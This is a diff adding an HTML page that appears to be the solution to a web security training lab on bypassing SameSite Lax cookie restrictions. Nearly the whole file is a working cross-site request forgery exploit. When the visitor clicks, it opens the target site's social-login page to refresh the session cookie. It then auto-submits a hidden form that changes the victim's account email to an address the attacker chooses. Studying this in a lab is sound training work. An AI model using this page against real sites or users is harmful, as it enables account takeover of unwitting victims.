@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>
+            Lab: SameSite Lax bypass via cookie refresh
+        </title>
+    </head>
+    <body>
+        <script>
+            history.pushState('', '', '/')
+        </script>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="abcd@normal-user.net">
+        </form>
+    </body>
+
+    <script>
+        window.onclick = () => {
+            window.open('https://WEBSITE-URL/social-login');
+            document.forms[0].submit();
+        }
+    </script>
+</html>
